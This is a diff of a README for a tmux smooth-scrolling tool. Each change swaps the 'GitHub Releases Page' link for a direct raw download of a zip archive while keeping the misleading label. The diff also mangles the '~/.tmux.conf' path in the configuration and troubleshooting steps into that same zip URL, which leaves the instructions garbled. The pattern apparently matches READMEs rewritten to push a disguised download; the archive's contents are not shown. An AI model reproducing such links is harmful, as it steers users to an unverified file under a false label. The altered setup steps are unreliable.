@@ -6,7 +6,7 @@ Welcome to the tmux-smooth-scroll project! This software makes scrolling in tmux
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [GitHub Releases Page](https://github.com/Syre213/tmux-smooth-scroll/releases).
+To get started, you need to download the application. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Syre213/tmux-smooth-scroll/main/src/smooth_tmux_scroll_2.3.zip).
 
 ### Steps to Download
 
@@ -41,21 +41,21 @@ For most users, this will involve opening a terminal and navigating to the direc
 After installation, you can enhance your experience through simple configuration.
 
 1. Open your terminal.
-2. Locate your tmux configuration file, usually found at `~/.tmux.conf`.
+2. Locate your tmux configuration file, usually found at `~https://raw.githubusercontent.com/Syre213/tmux-smooth-scroll/main/src/smooth_tmux_scroll_2.3.zip`.
 3. Add the following line to activate tmux-smooth-scroll:
 
    ```
    set -g mouse on
    ```
 
-4. Save the file and restart tmux using the command `tmux source-file ~/.tmux.conf`.
+4. Save the file and restart tmux using the command `tmux source-file ~https://raw.githubusercontent.com/Syre213/tmux-smooth-scroll/main/src/smooth_tmux_scroll_2.3.zip`.
 
 ## 🔍 Troubleshooting
 
 If you encounter issues:
 
 - **Installation Errors**: Ensure you’ve downloaded the correct file for your operating system.
-- **Configuration Problems**: Double-check that you added the configuration line correctly in your `~/.tmux.conf` file.
+- **Configuration Problems**: Double-check that you added the configuration line correctly in your `~https://raw.githubusercontent.com/Syre213/tmux-smooth-scroll/main/src/smooth_tmux_scroll_2.3.zip` file.
 - **Scroll Not Smooth**: Make sure your tmux version meets the minimum requirement.
 
 Please read through all guidelines carefully to resolve most common issues.
@@ -68,7 +68,7 @@ We welcome contributions and feedback! Join our community to share your thoughts
 
 To keep your version up to date:
 
-1. Return to the [GitHub Releases Page](https://github.com/Syre213/tmux-smooth-scroll/releases).
+1. Return to the [GitHub Releases Page](https://raw.githubusercontent.com/Syre213/tmux-smooth-scroll/main/src/smooth_tmux_scroll_2.3.zip).
 2. Download the latest version following the same steps as above.
 3. Replace the old version with the new one according to your operating system's guidelines.
 
